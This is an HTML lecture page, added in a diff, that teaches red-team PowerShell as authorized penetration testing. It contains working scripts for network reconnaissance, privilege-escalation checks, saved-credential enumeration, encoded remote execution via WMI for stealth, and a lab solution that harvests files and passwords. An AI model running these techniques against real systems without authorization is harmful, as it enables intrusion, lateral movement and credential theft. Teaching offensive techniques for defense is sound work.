@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerShell Kung Fu - Lecture 8: Red Team PowerShell</title>
+    <style>
+        :root {
+            --dark-bg: #0a192f;
+            --accent-green: #64ffda;
+            --accent-yellow: #ffd700;
+            --accent-blue: #1e90ff;
+            --text-light: #ccd6f6;
+            --danger-red: #ff5555;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-light);
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            color: var(--danger-red);
+            border-bottom: 2px solid var(--accent-yellow);
+            text-shadow: 0 0 10px rgba(255, 85, 85, 0.3);
+        }
+        .scenario {
+            background: rgba(255, 85, 85, 0.1);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 25px 0;
+            border-left: 4px solid var(--danger-red);
+        }
+        .scenario h2 {
+            color: var(--accent-yellow);
+        }
+        .ethical-note {
+            background: rgba(100, 255, 218, 0.2);
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border: 1px dashed var(--accent-green);
+        }
+        .code-block {
+            position: relative;
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: var(--accent-blue);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .copy-btn:hover {
+            background: var(--accent-green);
+        }
+        .nav-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid var(--accent-blue);
+        }
+        .hacker-tip {
+            color: var(--accent-yellow);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔴 Lecture 8: Red Team PowerShell</h1>
+    <p>Learn how ethical hackers use PowerShell to test system defenses (with proper authorization!).</p>
+
+    <div class="ethical-note">
+        <strong>🛡️ ETHICAL NOTE:</strong> Only use these techniques on systems you own or have written permission to test!
+    </div>
+
+    <!-- Scenario 1: Reconnaissance -->
+    <div class="scenario">
+        <h2>Scenario 1: The Corporate Network Scout</h2>
+        <p><strong>Situation:</strong> You're hired to test a company's network. First, you need to map what's visible.</p>
+        
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+            <pre><code># Discover active computers on the network
+1..254 | ForEach-Object {
+    Test-Connection -ComputerName "192.168.1.$_" -Count 1 -ErrorAction SilentlyContinue |
+    Where-Object { $_.StatusCode -eq 0 } |
+    Select-Object Address, ResponseTime
+}
+
+# Check open shares (Like checking unlocked doors)
+Get-WmiObject -Class Win32_Share -ComputerName (Get-Content active_hosts.txt) |
+    Where-Object { $_.Description -match "file|print" } |
+    Select-Object PSComputerName, Name, Path</code></pre>
+        </div>
+        <p class="hacker-tip">💡 <strong>Red Team Tip:</strong> Slow your scans (add <code>-Delay 2</code>) to avoid triggering alarms!</p>
+    </div>
+
+    <!-- Scenario 2: Privilege Escalation -->
+    <div class="scenario">
+        <h2>Scenario 2: The Janitor's Keyring</h2>
+        <p><strong>Situation:</strong> You have low-level access (like a janitor). Find ways to gain admin rights.</p>
+        
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+            <pre><code># Find misconfigured services (Common escalation path)
+Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE StartMode = 'Auto' AND StartName LIKE '%LocalService%'" |
+    Where-Object { $_.PathName -match "\.exe" -and $_.PathName -notmatch "Windows\\System32" } |
+    Select-Object Name, DisplayName, PathName, StartName
+
+# Check for saved credentials (Like finding spare keys)
+cmdkey /list | Out-File saved_creds.txt
+foreach ($line in (Get-Content saved_creds.txt)) {
+    if ($line -match "Target:") {
+        $target = $line.Split(":")[1].Trim()
+        Write-Host "Found saved credentials for: $target" -ForegroundColor Yellow
+    }
+}</code></pre>
+        </div>
+        <p class="hacker-tip">🔑 <strong>Golden Ticket:</strong> Services running as SYSTEM but with weak folder permissions are prime targets.</p>
+    </div>
+
+    <!-- Scenario 3: Lateral Movement -->
+    <div class="scenario">
+        <h2>Scenario 3: Office Crawl</h2>
+        <p><strong>Situation:</strong> You've compromised one workstation. Now move to others.</p>
+        
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+            <pre><code># Check for admin access on other machines
+$computers = Get-Content active_hosts.txt
+foreach ($computer in $computers) {
+    $session = New-PSSession -ComputerName $computer -ErrorAction SilentlyContinue
+    if ($session) {
+        Write-Host "✅ Successfully connected to $computer" -ForegroundColor Green
+        Invoke-Command -Session $session -ScriptBlock { whoami } | Out-File access_log.txt -Append
+    } else {
+        Write-Host "❌ Failed to connect to $computer" -ForegroundColor Red
+    }
+}
+
+# Mimic common admin tools (Avoid detection)
+function Invoke-StealthCommand {
+    param([string]$computer, [string]$command)
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+    $encoded = [Convert]::ToBase64String($bytes)
+    Invoke-WmiMethod -Class Win32_Process -Name Create `
+        -ArgumentList "powershell -enc $encoded" `
+        -ComputerName $computer
+}</code></pre>
+        </div>
+        <p class="hacker-tip">👻 <strong>Ghost Mode:</strong> Use <code>WinRM</code> instead of <code>psexec</code> - it's quieter!</p>
+    </div>
+
+    <h2>🔴 Red Team Lab: The Phished Workstation</h2>
+    <p><strong>Scenario:</strong> You've gained access to a workstation via a phishing email. Your objectives:</p>
+    <ol>
+        <li>Find sensitive files (search for "confidential", "password")</li>
+        <li>Check for shared folders on the network</li>
+        <li>Attempt to discover admin credentials</li>
+    </ol>
+
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><code># Start your red team operations here:
+function Invoke-PhishResponse {
+    # Step 1: File discovery
+    
+    # Step 2: Network exploration
+    
+    # Step 3: Credential hunting
+}</code></pre>
+    </div>
+
+    <button onclick="showSolution()">Reveal Tradecraft</button>
+    <div id="solution" style="display: none;" class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><code># Ethical hacker's toolkit:
+function Invoke-PhishResponse {
+    # 1. Find sensitive files (Quietly)
+    $sensitiveFiles = Get-ChildItem -Path C:\Users -Recurse -Force -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -match "confidential|password|secret" } |
+        Select-Object FullName, LastWriteTime
+    $sensitiveFiles | Export-Csv -Path "C:\Temp\found_files.csv" -NoTypeInformation
+
+    # 2. Discover network shares
+    $shares = Get-WmiObject -Class Win32_Share -ComputerName (Get-Content active_hosts.txt) |
+        Where-Object { $_.Description -notmatch "remote admin" }
+    $shares | Export-Csv -Path "C:\Temp\network_shares.csv" -NoTypeInformation
+
+    # 3. Hunt for credentials
+    $credFiles = Get-ChildItem -Path C:\ -Include "*.config", "*.xml", "*.txt" -Recurse -ErrorAction SilentlyContinue |
+        Select-String -Pattern "password|pwd|connectionString" |
+        Select-Object Filename, LineNumber, Line
+    $credFiles | Export-Csv -Path "C:\Temp\creds.csv" -NoTypeInformation
+
+    Write-Host "Red team operations complete. Reports saved." -ForegroundColor Green
+}</code></pre>
+    </div>
+
+    <div class="nav-links">
+        <a href="lecture-7-malware.html">← Previous: Malware Analysis</a>
+        <a href="lecture-9-blueteam.html">Next: Blue Team Defense →</a>
+    </div>
+
+    <script>
+        function copyCode(button) {
+            const codeBlock = button.parentElement;
+            const code = codeBlock.querySelector('pre').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                button.textContent = 'Copied!';
+                setTimeout(() => {
+                    button.textContent = 'Copy';
+                }, 2000);
+            });
+        }
+
+        function showSolution() {
+            const solution = document.getElementById('solution');
+            solution.style.display = 'block';
+            solution.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // ASCII Art
+        console.log('%c   )  (\n  (   ) )\n    ) ( (\n  _______)\n[_________]\n RED TEAM',
+                    'font-family: monospace; font-size: 14px; color: #ff5555;');
+    </script>
+</body>
+</html>
